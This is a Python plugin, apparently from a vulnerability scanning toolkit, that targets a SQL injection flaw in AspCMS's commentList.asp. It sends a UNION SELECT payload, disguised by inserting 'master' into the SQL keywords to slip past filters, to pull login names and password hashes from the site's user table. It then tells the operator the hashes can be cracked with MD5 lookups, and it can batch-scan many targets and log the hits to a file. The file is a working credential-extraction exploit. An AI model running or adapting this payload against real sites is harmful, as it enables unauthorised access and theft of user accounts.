#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class AspCMS_Sql_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if "clistbox" in req.text:
                OutPrintInfoSuc("AspCMS", f'目标commentList.asp存在SQL注入漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("AspCMS", "可通过md5解密密码")
                else:
                    OutPutFile("aspcms_sql.txt",f'目标commentList.asp存在SQL注入漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("AspCMS", f'目标commentList.asp不存在SQL注入漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("AspCMS",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("AspCMS", '开始检测commentList.as SQL漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("AspCMS", 'commentList.as SQL漏洞检测结束')



